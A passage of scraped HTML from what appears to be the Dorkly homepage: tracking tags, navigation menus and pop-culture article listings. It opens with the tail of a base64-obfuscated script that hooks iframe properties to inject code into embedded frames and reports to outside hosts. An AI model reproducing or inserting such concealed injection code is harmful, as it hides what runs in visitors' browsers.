ndW1lbnRzKX0sZW51bWVyYWJsZTohMH0pfX0scz1mdW5jdGlvbigpe3JldHVybiBmdW5jdGlvbih0LG4sZSl7cmV0dXJuIHQuYXBwbHkobixlKX19LGM9ZnVuY3Rpb24odCl7cmV0dXJuIGZ1bmN0aW9uKGUscixvKXt0cnl7dmFyIGk9b1swXTtpZihpLmluZGV4T2YoImh0bWwiKSE9PS0xKXt2YXIgYT1pLnNwbGl0KCI7Iikscz1hWzFdLGM9cGFyc2VJbnQocykrdC5sZW5ndGg7YVsxXT1jLnRvU3RyaW5nKCksaT1hLmpvaW4oIjsiKSxpPWkucmVwbGFjZSgiPGhlYWQ+IiwiPGhlYWQ+Iit0KSxvWzBdPWl9fWNhdGNoKGQpe24oZCl9cmV0dXJuIGUuYXBwbHkocixvKX19LGQ9ZnVuY3Rpb24oKXtyZXR1cm4gZnVuY3Rpb24odCl7dmFyIG49ITE7aWYodC5zcmMmJjAhPT10LnNyYy5pbmRleE9mKCJqYXZhc2NyaXB0OiIpJiYwIT09dC5zcmMuaW5kZXhPZigiYWJvdXQ6YmxhbmsiKSl7dmFyIGU9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiYSIpO2UuaHJlZj10LnNyYzt2YXIgcj1lLmhvc3Q7cj09PXdpbmRvdy5sb2NhdGlvbi5ob3N0JiYobj0hMCl9ZWxzZSBuPSEwO3JldHVybiBufX0sdT1mdW5jdGlvbih0KXtyZXR1cm4gZnVuY3Rpb24oZSxyKXt2YXIgbz1yLndyaXRlO3Iud3JpdGU9ZnVuY3Rpb24oZSl7dHJ5e3RoaXMuX2luamVjdGVkfHwoZS5pbmRleE9mKCI8aGVhZD4iKSE9PS0xPyhlPWUucmVwbGFjZSgvPGhlYWQ+KC4qKTxcL2hlYWQ+LyxmdW5jdGlvbihuLGUpe3JldHVybiI8aGVhZD4iK3QrZSsiPC9oZWFkPiJ9KSx0aGlzLl9pbmplY3RlZD0hMCk6ZS5pbmRleE9mKCI8Ym9keSIpIT09LTE/KGU9ZS5yZXBsYWNlKC8oPGJvZHkuKj8+KS8sZnVuY3Rpb24obixlKXtyZXR1cm4gZSt0fSksdGhpcy5faW5qZWN0ZWQ9ITApOmUuaW5kZXhPZigiPHNjcmlwdCIpIT09LTEmJihlPWUucmVwbGFjZSgvKDxzY3JpcHQuKj8+Lio8XC9zY3JpcHQ+KS8sZnVuY3Rpb24obixlKXtyZXR1cm4gdCtlfSksdGhpcy5faW5qZWN0ZWQ9ITApKX1jYXRjaChyKXtuKHIpfXJldHVybiBvLmNhbGwodGhpcyxlKX19fSxmPWZ1bmN0aW9uKHQsZSl7cmV0dXJuIGZ1bmN0aW9uKHIsbyxpKXt2YXIgYT1yLmFwcGx5KG8saSk7dHJ5e2lmKG8uY29udGVudERvY3VtZW50RGVjb3JhdGVkKXJldHVybiBhO28uY29udGVudERvY3VtZW50RGVjb3JhdGVkPSEwLGUobykmJnQobyxhKX1jYXRjaChzKXtuKHMpfXJldHVybiBhfX0sbD1mdW5jdGlvbigpe3JldHVybiBmdW5jdGlvbih0LG4sZSl7cmV0dXJuIHQuYXBwbHkobixlKX19LHA9ZnVuY3Rpb24odCxlKXtyZXR1cm4gZnVuY3Rpb24ocixvLGkpe3ZhciBhPXIuYXBwbHkobyxpKTt0cnl7aWYoby5jb250ZW50V2luZG93RGVjb3JhdGVkKXJldHVybiBhO28uY29udGVudFdpbmRvd0RlY29yYXRlZD0hMCxlKG8pJiZ0KG8sYS5kb2N1bWVudCl9Y2F0Y2gocyl7bihzKX1yZXR1cm4gYX19LHc9ZnVuY3Rpb24oKXtyZXR1cm4gZnVuY3Rpb24odCxuLGUpe3JldHVybiB0LmFwcGx5KG4sZSl9fSxnPVsnPHNjcmlwdCB0eXBlPSJ0ZXh0L2phdmFzY3JpcHQiPignLGUudG9TdHJpbmcoKSwiKSgiLFtpLnRvU3RyaW5nKCksYS50b1N0cmluZygpLHMudG9TdHJpbmcoKSxjLnRvU3RyaW5nKCksZC50b1N0cmluZygpLHUudG9TdHJpbmcoKSxmLnRvU3RyaW5nKCksbC50b1N0cmluZygpLHAudG9TdHJpbmcoKSx3LnRvU3RyaW5nKCldLmpvaW4oIiwiKS50b1N0cmluZygpLCIpPCIsIi9zY3JpcHQ+Il0uam9pbigiIik7YSgpKEhUTUxJRnJhbWVFbGVtZW50LCJuYW1lIixzKCksYyhnKSksYSgpKEhUTUxJRnJhbWVFbGVtZW50LCJjb250ZW50RG9jdW1lbnQiLGYodShnKSxkKCkpLGwoKSksYSgpKEhUTUxJRnJhbWVFbGVtZW50LCJjb250ZW50V2luZG93IixwKHUoZyksZCgpKSx3KCkpfSgpfSx7NTo1fV0sMjpbZnVuY3Rpb24odCxuLGUpeyJ1c2Ugc3RyaWN0Ijt2YXIgcj10KDMpO3dpbmRvdy5hZG9uaXNIYXNoPXdpbmRvdy5hZG9uaXNIYXNofHx3aW5kb3cubG9jYXRpb24uaGFzaHx8IiI7dmFyIG89d2luZG93LmFkb25pc0hhc2guaW5kZXhPZigiYWRvbmlzLWxvZ2dpbmciKT49MDtyLkxPR19MRVZFTD1vPyJkZWJ1ZyI6ci5MT0dfTEVWRUw7dmFyIGk9d2luZG93LmFkb25pc3x8e307aS53c0hvc3QmJnIuV1MmJihyLldTLmhvc3Q9aS53c0hvc3QpLGkudHJhbnNwb3J0JiZyLlNVRVpfSFRUUF9FTkRQT0lOVCYmKHIuU1VFWl9IVFRQX0VORFBPSU5UPWkudHJhbnNwb3J0KSxuLmV4cG9ydHM9cn0sezM6M31dLDM6W2Z1bmN0aW9uKHQsbixlKXsidXNlIHN0cmljdCI7bi5leHBvcnRzPXtSRUFMX1NUVU5fSE9TVDoic3R1bi54cGFuYW1hLm5ldDozNDc4IixUVVJOU0lHTkFMX0hPU1Q6InRzLnAueHBhbmFtYS5uZXQ6NzAwMCIsU1RVTkdVTl9IT1NUOiJzZy5wLnhwYW5hbWEubmV0OjM0ODAiLFNFUlZFUl9DQU5ESURBVEU6ImNhbmRpZGF0ZTo4Mjc2NDgwMjYgMSB1ZHAgMjEyMjE5NDY4NyBTRVJWRVJfSVAgU0VSVkVSX1BPUlQgdHlwIGhvc3QgZ2VuZXJhdGlvbiAwIixSRVBPUlRJTkdfVVJMOiJodHRwczovL2xiLnN0YXRzZXZlbnQuY29tL3N0YXRzIixSRVBPUlRJTkdfUkFURTouMDEsTE9HX0xFVkVMOiJlcnJvciIsUkVQT1JUX0VSUk9SUzohMCxNQU5JRkVTVF9VUkw6Imh0dHBzOi8vc3JpLmpzaW50ZWdyaXR5LmNvbS9tYW5pZmVzdC5qc29uIixNQU5JRkVTVF9FWFBJUkFUSU9OX1RJTUU6ODY0MDAsQURfTUFSS0VSOiJhZG9uaXMtbWFya2VyIixBRE9OSVNfQ0xJRU5UX0ZFVENIX1VSTDoiaHR0cHM6Ly9hZHNlcnZlci54cGFuYW1hLm5ldC9jbGllbnQtNy1sYXRlc3QuanMiLFdTOntob3N0OiJzdWV6LXNlcnZlci54cGFuYW1hLm5ldCIscGF0aDoiL3dzIixwb3J0OjQ0MyxzZWN1cmU6ITAscHJvbWlzZVRpbWVvdXQ6M2UzfSxTRVJWSUNFX1NUQVRVU19VUkw6ZnVuY3Rpb24odCl7cmV0dXJuImh0dHBzOi8vY2xpZW50LnJlYWN0cmpzLmNvbS8iK3QrIi1zdGF0dXMuanNvbiJ9LFNVRVpfSFRUUF9FTkRQT0lOVDoiaHR0cHM6Ly9zdWV6LnhwYW5hbWEubmV0L2h0dHAiLFNVRVpfSFRUUF9SRVRSWTozLFNVRVpfSFRUUF9ERUxBWToxMDB9fSx7fV0sNDpbZnVuY3Rpb24odCxuLGUpeyJ1c2Ugc3RyaWN0IjtmdW5jdGlvbiByKHQpe3JldHVybiB0JiZ0Ll9fZXNNb2R1bGU/dDp7ImRlZmF1bHQiOnR9fXZhciBvPXQoMiksaT1yKG8pLGE9dCg3KSxzPSgwLGEuY3JlYXRlKSh7bGV2ZWw6aVsiZGVmYXVsdCJdLkxPR19MRVZFTH0pO24uZXhwb3J0cz17bG9nZ2VyOnMsc3VlekxvZ2dlcjpzfX0sezI6Miw3Ojd9XSw1OltmdW5jdGlvbih0LG4sZSl7InVzZSBzdHJpY3QiO2Z1bmN0aW9uIHIodCl7dmFyIG49bmV3IFhNTEh0dHBSZXF1ZXN0LGU9W2QuUkVQT1JUSU5HX1VSTCx0XS5qb2luKCIiKTtuLm9wZW4oIkdFVCIsZSwhMCksbi5zZW5kKCl9ZnVuY3Rpb24gbyh0KXtkLlJFUE9SVF9FUlJPUlMmJnIoIi9hZG9uaXNfZXJyb3I/ZT0iK3QudG9TdHJpbmcoKSsiJndlYnNpdGU9Iit3aW5kb3cubG9jYXRpb24uaG9zdG5hbWUpfWZ1bmN0aW9uIGkoKXtyZXR1cm4gbnVsbCE9d2luZG93LkFET05JU19CT09UU1RSQVBfU1RBVFM/d2luZG93LkFET05JU19CT09UU1RSQVBfU1RBVFM9PT0hMDpNYXRoLnJhbmRvbSgpPGQuUkVQT1JUSU5HX1JBVEV9ZnVuY3Rpb24gYSh0LG4pe2lmKHModCksaSgpKXt2YXIgZT17d2Vic2l0ZTp3aW5kb3cubG9jYXRpb24uaG9zdG5hbWUsa2V5OnR9O251bGwhPW4mJihlLnF1YW50aXR5PW4pLHIoWyIvYWRvbmlzX2V2ZW50Lz9ldmVudD0iLEpTT04uc3RyaW5naWZ5KGUpXS5qb2luKCIiKSl9fWZ1bmN0aW9uIHModCl7dmFyIG49e2tleTp0LHRpbWVfbXM6TWF0aC5yb3VuZCh3aW5kb3cucGVyZm9ybWFuY2Uubm93KCkpLHdlYnNpdGU6d2luZG93LmxvY2F0aW9uLmhvc3RuYW1lfTtmLnB1c2gobil9ZnVuY3Rpb24gYygpe3UuZGVmaW5lUmVhZE9ubHlQcm9wZXJ0eSgiYWRvbmlzQm9vdHN0cmFwVGltaW5nIixmKX12YXIgZD10KDIpLHU9dCg2KSxmPVtdO24uZXhwb3J0cz17cmVwb3J0RXJyb3I6byxyZXBvcnRFdmVudDphLHNhdmVUaW1pbmc6YyxzaG91bGRSZXBvcnQ6aX19LHsyOjIsNjo2fV0sNjpbZnVuY3Rpb24odCxuLGUpeyJ1c2Ugc3RyaWN0IjtmdW5jdGlvbiByKHQsbil7dHJ5e09iamVjdC5kZWZpbmVQcm9wZXJ0eSh3aW5kb3csdCx7dmFsdWU6bix3cml0YWJsZTohMX0pfWNhdGNoKGUpe28ud2FybigiQ2Fubm90IGRlZmluZSByZWFkLW9ubHkgcHJvcGVydHkgb2Ygd2luZG93IG9iamVjdDogIitlKX19dmFyIG89dCg0KS5sb2dnZXIsaT1mdW5jdGlvbih0KXsibG9hZGluZyIhPT1kb2N1bWVudC5yZWFkeVN0YXRlP3QoKTpkb2N1bWVudC5hZGRFdmVudExpc3RlbmVyKCJET01Db250ZW50TG9hZGVkIix0KX07bi5leHBvcnRzPXtkZWZpbmVSZWFkT25seVByb3BlcnR5OnIscmVhZHk6aX19LHs0OjR9XSw3OltmdW5jdGlvbih0LG4sZSl7ZnVuY3Rpb24gcih0LG4pe2NvbnN0IGU9YVtuXTt2b2lkIDAhPT1lJiYoZT4wJiYodC5hc3NlcnQ9ZnVuY3Rpb24oKXt9KSxlPjUmJih0LnRyYWNlPWZ1bmN0aW9uKCl7fSksZT4xMCYmKHQuZGVidWc9ZnVuY3Rpb24oKXt9KSxlPjIwJiYodC5sb2c9ZnVuY3Rpb24oKXt9KSxlPjMwJiYodC5pbmZvPWZ1bmN0aW9uKCl7fSksZT40MCYmKHQud2Fybj1mdW5jdGlvbigpe30pLGU+NTAmJih0LmVycm9yPWZ1bmN0aW9uKCl7fSkpfWZ1bmN0aW9uIG8odCxuKXtuPW58fHt9O2NvbnN0IGU9bi5sZXZlbHx8ImRlYnVnIjtyKHQsZSl9ZnVuY3Rpb24gaSh0KXtjb25zdCBuPU9iamVjdC5jcmVhdGUoY29uc29sZSk7cmV0dXJuIG8obix0KSxufWNvbnN0IGE9e2FsbDowLHRyYWNlOjUsZGVidWc6MTAsbG9nOjIwLGluZm86MzAsd2Fybjo0MCxlcnJvcjo1MH0scz1pKCk7bi5leHBvcnRzPXtsb2dnZXI6cyxjb25maWd1cmU6byxjcmVhdGU6aX19LHt9XX0se30sWzFdKTs="));</script>
    <!-- Begin comScore Tag -->
    <script> var _comscore = _comscore || []; _comscore.push({ c1: "2", c2: "6511178" }); (function() {var s = document.createElement("script"), el = document.getElementsByTagName("script")[0]; s.async = true; s.src = (document.location.protocol == "https:" ? "https://sb" : "http://b") + ".scorecardresearch.com/beacon.js"; el.parentNode.insertBefore(s, el); })(); </script>
    <noscript><img src="https://sb.scorecardresearch.com/p?c1=2&amp;c2=6511178&amp;c4=https://www.dorkly.com/" /></noscript>
    <!-- End comScore Tag -->
            <!-- Page hiding snippet (recommended) -->
<style>.async-hide { opacity: 0 !important} </style>
<script>
(function(a,s,y,n,c,h,i,d,e){s.className+=' '+y;
h.end=i=function(){s.className=s.className.replace(RegExp(' ?'+y),'')};
(a[n]=a[n]||[]).hide=h;setTimeout(function(){i();h.end=null},c);
})(window,document.documentElement,'async-hide','dataLayer',4000,{'GTM-P85XMQ':true});
</script>
<!-- Note: Google Tag Manager ID for Dorkly = GTM-P85XMQ -->        <!-- Google Tag Manager for Dorkly (GTM-P85XMQ) -->
<noscript><iframe src="//www.googletagmanager.com/ns.html?id=GTM-P85XMQ"
height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
'//www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
})(window,document,'script','dataLayer','GTM-P85XMQ');</script>
<!-- End Google Tag Manager for Dorkly (GTM-P85XMQ) -->            <nav class="nav-menu ga-feature-usage" data-ga-feature="Navigation" data-ga-category="Navigation" role="navigation">
		<ul class="nav navbar-nav nav-tabs-5">
								<li class="videos dropdown ga-feature-usage ga-interaction" data-ga-feature="Navigation Drop Down - Videos">
				<div class="nav-link-wrapper closed">
					<a   href="http://www.dorkly.com/videos" class="dropdown-toggle" data-toggle="dropdown" data-ga-category="Navigation" data-ga-label="Videos">Videos</a>
									<div class="caret-wrapper">
						<span class="caret"></span>
					</div>
					<div class="dropdown-menu ga-feature-usage" data-ga-feature="Navigation Dropdown" data-ga-category="Navigation">
						<ul>
														<li><a  href="http://www.dorkly.com/originals" class="" data-ga-category="Navigation" data-ga-label="Videos: All Originals">All Originals</a></li>
														<li><a  href="http://www.dorkly.com/tag/pokemon-rusty/videos" class="" data-ga-category="Navigation" data-ga-label="Videos: Pokemon Rusty">Pokemon Rusty</a></li>
														<li><a  href="http://www.dorkly.com/tag/mortal-kombat/videos" class="" data-ga-category="Navigation" data-ga-label="Videos: Mortal Kombat">Mortal Kombat</a></li>
														<li><a  href="http://www.dorkly.com/tag/mario/videos" class="" data-ga-category="Navigation" data-ga-label="Videos: Mario">Mario</a></li>
														<li><a  href="http://www.dorkly.com/tag/star-wars/videos" class="" data-ga-category="Navigation" data-ga-label="Videos: Star Wars">Star Wars</a></li>
														<li><a  href="http://www.dorkly.com/tag/batman/videos" class="" data-ga-category="Navigation" data-ga-label="Videos: Batman">Batman</a></li>
														<li><a  href="http://www.dorkly.com/tag/pokemon/videos" class="" data-ga-category="Navigation" data-ga-label="Videos: Pokemon">Pokemon</a></li>
													</ul>
					</div>
				</div>
						</li>
								<li class="articles dropdown ga-feature-usage ga-interaction" data-ga-feature="Navigation Drop Down - Articles">
				<div class="nav-link-wrapper closed">
					<a   href="http://www.dorkly.com/articles" class="dropdown-toggle" data-toggle="dropdown" data-ga-category="Navigation" data-ga-label="Articles">Articles</a>
									<div class="caret-wrapper">
						<span class="caret"></span>
					</div>
					<div class="dropdown-menu ga-feature-usage" data-ga-feature="Navigation Dropdown" data-ga-category="Navigation">
						<ul>
														<li><a  href="http://www.dorkly.com/tag/pokemon/articles" class="" data-ga-category="Navigation" data-ga-label="Articles: Pokemon">Pokemon</a></li>
														<li><a  href="http://www.dorkly.com/tag/skyrim/articles" class="" data-ga-category="Navigation" data-ga-label="Articles: Skyrim">Skyrim</a></li>
														<li><a  href="http://www.dorkly.com/tag/fallout/articles" class="" data-ga-category="Navigation" data-ga-label="Articles: Fallout">Fallout</a></li>
														<li><a  href="http://www.dorkly.com/tag/batman/articles" class="" data-ga-category="Navigation" data-ga-label="Articles: Batman">Batman</a></li>
														<li><a  href="http://www.dorkly.com/tag/marvel/articles" class="" data-ga-category="Navigation" data-ga-label="Articles: Marvel">Marvel</a></li>
														<li><a  href="http://www.dorkly.com/tag/nintendo/articles" class="" data-ga-category="Navigation" data-ga-label="Articles: Nintendo">Nintendo</a></li>
														<li><a  href="http://www.dorkly.com/tag/tv/articles" class="" data-ga-category="Navigation" data-ga-label="Articles: TV">TV</a></li>
													</ul>
					</div>
				</div>
						</li>
								<li class="pictures dropdown ga-feature-usage ga-interaction" data-ga-feature="Navigation Drop Down - Pictures">
				<div class="nav-link-wrapper closed">
					<a   href="http://www.dorkly.com/pictures" class="dropdown-toggle" data-toggle="dropdown" data-ga-category="Navigation" data-ga-label="Pictures">Pictures</a>
									<div class="caret-wrapper">
						<span class="caret"></span>
					</div>
					<div class="dropdown-menu ga-feature-usage" data-ga-feature="Navigation Dropdown" data-ga-category="Navigation">
						<ul>
														<li><a  href="http://www.dorkly.com/tag/cosplay/pictures" class="" data-ga-category="Navigation" data-ga-label="Pictures: Cosplay">Cosplay</a></li>
														<li><a  href="http://www.dorkly.com/tag/fanart/pictures" class="" data-ga-category="Navigation" data-ga-label="Pictures: Fan Art">Fan Art</a></li>
														<li><a  href="http://www.dorkly.com/tag/infographic/pictures" class="" data-ga-category="Navigation" data-ga-label="Pictures: Infographic">Infographic</a></li>
														<li><a  href="http://www.dorkly.com/tag/gif-of-the-day/pictures" class="" data-ga-category="Navigation" data-ga-label="Pictures: GIF of the Day">GIF of the Day</a></li>
														<li><a  href="http://www.dorkly.com/tag/doctor-who/pictures" class="" data-ga-category="Navigation" data-ga-label="Pictures: Doctor Who">Doctor Who</a></li>
													</ul>
					</div>
				</div>
						</li>
								<li class="comics dropdown ga-feature-usage ga-interaction" data-ga-feature="Navigation Drop Down - Comics">
				<div class="nav-link-wrapper closed">
					<a   href="http://www.dorkly.com/comics" class="dropdown-toggle" data-toggle="dropdown" data-ga-category="Navigation" data-ga-label="Comics">Comics</a>
									<div class="caret-wrapper">
						<span class="caret"></span>
					</div>
					<div class="dropdown-menu ga-feature-usage" data-ga-feature="Navigation Dropdown" data-ga-category="Navigation">
						<ul>
														<li><a  href="http://www.dorkly.com/comics" class="" data-ga-category="Navigation" data-ga-label="Comics: Recent">Recent</a></li>
														<li><a  href="http://www.dorkly.com/comics/most-liked" class="" data-ga-category="Navigation" data-ga-label="Comics: Most Liked">Most Liked</a></li>
													</ul>
					</div>
				</div>
						</li>
								<li class="submit dropdown ga-feature-usage ga-interaction" data-ga-feature="Navigation Drop Down - Submit">
				<div class="nav-link-wrapper closed">
					<a   href="http://www.dorkly.com/static/write-for-us" data-ga-label="Submit">Submit</a>
							</li>
			</ul>
	</nav>
<div class="site-header-wrapper">
	<div id="ad-dynamic-header"><script type="text/javascript">if(typeof(googletag) != "undefined") { googletag.cmd.push(function() { googletag.display("ad-dynamic-header"); }); }</script></div>	<div id="ad-outstream"><script type="text/javascript">if(typeof(googletag) != "undefined") { googletag.cmd.push(function() { googletag.display("ad-outstream"); }); }</script></div>	<header class="navbar site-header" role="banner" style="">
		<div class="navbar-header cf">
			<input type="checkbox" id="nav-trigger" class="nav-trigger" />
			<label for="nav-trigger" class="expand-nav icon-hamburger menu-item ga-feature-usage ga-interaction ga-interaction-click-only" data-ga-feature="Open Menu"></label>
			<div class="logo-wrapper"><a href="/" class="logo navbar-brand ga-feature-usage ga-target-self" data-ga-feature="Logo" data-ga-category="Navigation" data-ga-label="Dorkly Logo" style="">Dorkly</a></div>
			<div class="pull-right">
				<div class="desktop-nav-extras">
					<ul class="nav-share">
						<li class="nav-label">Follow</li>
						<li><a href="https://twitter.com/dorkly" class="icon-twitter" target="_blank"></a></li>
						<li><a href="https://www.facebook.com/Dorkly" class="icon-facebook" target="_blank"></a></li>
						<li><a href="https://www.youtube.com/user/Dorkly" class="icon-youtube" target="_blank"></a></li>
					</ul>
				</div>
				<div class="ad"><div id="ad-nav-tab"><script type="text/javascript">if(typeof(googletag) != "undefined") { googletag.cmd.push(function() { googletag.display("ad-nav-tab"); }); }</script></div></div>
				<a href="#" class="search menu-item hide nav-search" data-show=".navbar-search" data-ga-category="Navigation" data-ga-label="Search Module"></a>
			</div>
		</div>
		<div class="navbar-form navbar-search" style="">
			<script>
			  (function() {
				var cx = '005471751329090648169:fakyahz_nrq';
			    var gcse = document.createElement('script');
			    gcse.type = 'text/javascript';
			    gcse.async = true;
			    gcse.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') +
			        '//www.google.com/cse/cse.js?cx=' + cx;
			    var s = document.getElementsByTagName('script')[0];
			    s.parentNode.insertBefore(gcse, s);
			  })();
			</script>
			<gcse:search linktarget="_parent"></gcse:search>
		</div>
	</header>
</div>

        <div id="skin-wrapper">
                    <div class="container container-main">
                                <div class="content cf">
                    
<div class="primary" data-schedule-id="1">
						<div class="to-affix">
					<article data-node-id="86100" class="pod pod-lead cf ga-feature-usage" data-ga-feature="Featured Content Item">
					<a href="/post/86100/how-to-make-a-nerdy-t-shirt-design" class="thumb" data-ga-category="Featured Content Item" data-ga-label="How to Make a Nerdy T-Shirt Design [Thumbnail]">
				<img src="http://0.static.dorkly.cvcdn.com/jument/images/placeholders/175x98.png" width="1048" height="416" class="lazy" alt="How to Make a Nerdy T-Shirt Design" data-src="http://0.media.dorkly.cvcdn.com/46/99/77f43dc1367cd5a3bfcda957ca93cefe.jpg" data-src-retina="http://1.media.dorkly.cvcdn.com/46/99/0d6bf683d6f247f00fb8f525ebcfdddf.jpg">
				<noscript>
					<img src="http://0.media.dorkly.cvcdn.com/46/99/77f43dc1367cd5a3bfcda957ca93cefe.jpg" width="1048" height="416" alt="How to Make a Nerdy T-Shirt Design">
				</noscript>
							</a>
				<section class="pod-lead-info">
						<h2 class="pod-lead-title"><a href="/post/86100/how-to-make-a-nerdy-t-shirt-design" data-ga-category="Featured Content Item" data-ga-label="How to Make a Nerdy T-Shirt Design [Title]">How to Make a Nerdy T-Shirt Design</a></h2>
			<p class="pod-lead-description">This applies to most nerdy graphic tees...</p>
			<a href="/post/86100/how-to-make-a-nerdy-t-shirt-design" class="btn">Read More</a>
		</section>
	</article>
		<div class="pods-media row cf ga-feature-usage" data-ga-feature="Listing" data-current-page="1">
							<div class="pod-wrapper">
	<div class="pod pod-post pod-large pod-0 pod-post cf">
		<article data-node-id="86123">
			<a href="/post/86123/tumblr-outer-space" class="thumb" data-ga-category="Listing" data-ga-label="12 Times Tumblr Told Us the Cold Hard Truth About Outer Space (Node ID: 86123) [Thumbnail]">
				<img src="http://0.static.dorkly.cvcdn.com/jument/images/placeholders/300x168.png" class="img-responsive lazy" alt="12 Times Tumblr Told Us the Cold Hard Truth About Outer Space" data-src="http://2.media.dorkly.cvcdn.com/69/24/0910eef78994add67432619e612f13c9.jpg" data-src-retina="http://0.media.dorkly.cvcdn.com/69/24/657333b0c01ee48998c02a60b322552e.jpg">
				<noscript>
					<img src="http://2.media.dorkly.cvcdn.com/69/24/0910eef78994add67432619e612f13c9.jpg" class="img-responsive" alt="12 Times Tumblr Told Us the Cold Hard Truth About Outer Space">
				</noscript>
							</a>
			<div class="caption">
								<h3 class="title"><a href="/post/86123/tumblr-outer-space" data-ga-category="Listing" data-ga-label="12 Times Tumblr Told Us the Cold Hard Truth About Outer Space (Node ID: 86123) [Title]">12 Times Tumblr Told Us the Cold Hard Truth About Outer Space</a></h3>
			</div>
			<script type="application/ld+json">{"@context": "http://schema.org", "@type": "ImageObject", "contentUrl": "http://2.media.dorkly.cvcdn.com/69/24/0910eef78994add67432619e612f13c9.jpg", "name": "12 Times Tumblr Told Us the Cold Hard Truth About Outer Space"}</script>
		</article>
	</div>
</div>											<div class="pod-wrapper">
	<div class="pod pod-post pod-large pod-1 pod-post cf">
		<article data-node-id="86133">
			<a href="/post/86133/rick-and-morty-fans-shocked-after-dan-harmon-reveals-no-season-4-order" class="thumb" data-ga-category="Listing" data-ga-label="Rick and Morty Fans Shocked After Dan Harmon Reveals No Season 4 Order (Node ID: 86133) [Thumbnail]">
				<img src="http://0.static.dorkly.cvcdn.com/jument/images/placeholders/300x168.png" class="img-responsive lazy" alt="Rick and Morty Fans Shocked After Dan Harmon Reveals No Season 4 Order" data-src="http://1.media.dorkly.cvcdn.com/74/11/0ba17ae90620252f6904e588637b85fc.jpg" data-src-retina="http://0.media.dorkly.cvcdn.com/74/11/2c72bc143512ce8fec69a285fba44854.jpg">
				<noscript>
					<img src="http://1.media.dorkly.cvcdn.com/74/11/0ba17ae90620252f6904e588637b85fc.jpg" class="img-responsive" alt="Rick and Morty Fans Shocked After Dan Harmon Reveals No Season 4 Order">
				</noscript>
							</a>
			<div class="caption">
								<h3 class="title"><a href="/post/86133/rick-and-morty-fans-shocked-after-dan-harmon-reveals-no-season-4-order" data-ga-category="Listing" data-ga-label="Rick and Morty Fans Shocked After Dan Harmon Reveals No Season 4 Order (Node ID: 86133) [Title]">Rick and Morty Fans Shocked After Dan Harmon Reveals No Season 4 Order</a></h3>
			</div>
			<script type="application/ld+json">{"@context": "http://schema.org", "@type": "ImageObject", "contentUrl": "http://1.media.dorkly.cvcdn.com/74/11/0ba17ae90620252f6904e588637b85fc.jpg", "name": "Rick and Morty Fans Shocked After Dan Harmon Reveals No Season 4 Order"}</script>
		</article>
	</div>
</div>											<div class="pod-wrapper">
	<div class="pod pod-post pod-large pod-2 pod-post cf">
		<article data-node-id="86127">
			<a href="/post/86127/hawkeye-missing-infinity-war" class="thumb" data-ga-category="Listing" data-ga-label="Everyone's Making Memes About Hawkeye Being Left Out of Infinity War (Node ID: 86127) [Thumbnail]">
				<img src="http://0.static.dorkly.cvcdn.com/jument/images/placeholders/300x168.png" class="img-responsive lazy" alt="Everyone&#039;s Making Memes About Hawkeye Being Left Out of Infinity War" data-src="http://0.media.dorkly.cvcdn.com/94/18/1995fca0a7142958e5917a17096afbd7.jpg" data-src-retina="http://2.media.dorkly.cvcdn.com/94/18/46bce8270759fa5bd239f3ea297d3af7.jpg">
				<noscript>
					<img src="http://0.media.dorkly.cvcdn.com/94/18/1995fca0a7142958e5917a17096afbd7.jpg" class="img-responsive" alt="Everyone&#039;s Making Memes About Hawkeye Being Left Out of Infinity War">
				</noscript>
							</a>
			<div class="caption">
								<h3 class="title"><a href="/post/86127/hawkeye-missing-infinity-war" data-ga-category="Listing" data-ga-label="Everyone's Making Memes About Hawkeye Being Left Out of Infinity War (Node ID: 86127) [Title]">Everyone's Making Memes About Hawkeye Being Left Out of Infinity War</a></h3>
			</div>
			<script type="application/ld+json">{"@context": "http://schema.org", "@type": "ImageObject", "contentUrl": "http://0.media.dorkly.cvcdn.com/94/18/1995fca0a7142958e5917a17096afbd7.jpg", "name": "Everyone&#039;s Making Memes About Hawkeye Being Left Out of Infinity War"}</script>
		</article>
	</div>
</div>											<div class="pod-wrapper">
	<div class="pod pod-post pod-large pod-3 pod-post cf">
		<article data-node-id="86122">
			<a href="/post/86122/4-reasons-why-the-new-tomb-raider-is-better-than-you-wouldve-guessed" class="thumb" data-ga-category="Listing" data-ga-label="4 Reasons Why the New Tomb Raider Is Better Than You Would've Guessed (Node ID: 86122) [Thumbnail]">
				<img src="http://0.static.dorkly.cvcdn.com/jument/images/placeholders/300x168.png" class="img-responsive lazy" alt="4 Reasons Why the New Tomb Raider Is Better Than You Would&#039;ve Guessed" data-src="http://1.media.dorkly.cvcdn.com/86/28/3b28590f6140b945675605a9a6239ba5.jpg" data-src-retina="http://0.media.dorkly.cvcdn.com/86/28/cd7f2ffd9c155930ef46487145a8ca33.jpg">
				<noscript>
					<img src="http://1.media.dorkly.cvcdn.com/86/28/3b28590f6140b945675605a9a6239ba5.jpg" class="img-responsive" alt="4 Reasons Why the New Tomb Raider Is Better Than You Would&#039;ve Guessed">
				</noscript>
							</a>
			<div class="caption">
								<h3 class="title"><a href="/post/86122/4-reasons-why-the-new-tomb-raider-is-better-than-you-wouldve-guessed" data-ga-category="Listing" data-ga-label="4 Reasons Why the New Tomb Raider Is Better Than You Would've Guessed (Node ID: 86122) [Title]">4 Reasons Why the New Tomb Raider Is Better Than You Would've Guessed</a></h3>
			</div>
			<script type="application/ld+json">{"@context": "http://schema.org", "@type": "ImageObject", "contentUrl": "http://1.media.dorkly.cvcdn.com/86/28/3b28590f6140b945675605a9a6239ba5.jpg", "name": "4 Reasons Why the New Tomb Raider Is Better Than You Would&#039;ve Guessed"}</script>
		</article>
	</div>
</div>									<aside class="hide"><iframe src="/jument/ads/dfp.html?zone=%2F8422%2Fdorkly.com%2Fhomepage&amp;size=%5B%5B1%2C2%5D%5D&amp;targeting%5Brating%5D=unrated" width="0" height="0" class="ad-iframe"></iframe></aside>
											<div class="pod-wrapper">
	<div class="pod pod-post pod-large pod-4 pod-post cf">
		<article data-node-id="86113">
			<a href="/post/86113/funny-dungeons-and-dragons-dnd-true-stories-funniest-stories" class="thumb" data-ga-category="Listing" data-ga-label="12 D&D Players Share Their Funniest In-Game Moments (Node ID: 86113) [Thumbnail]">
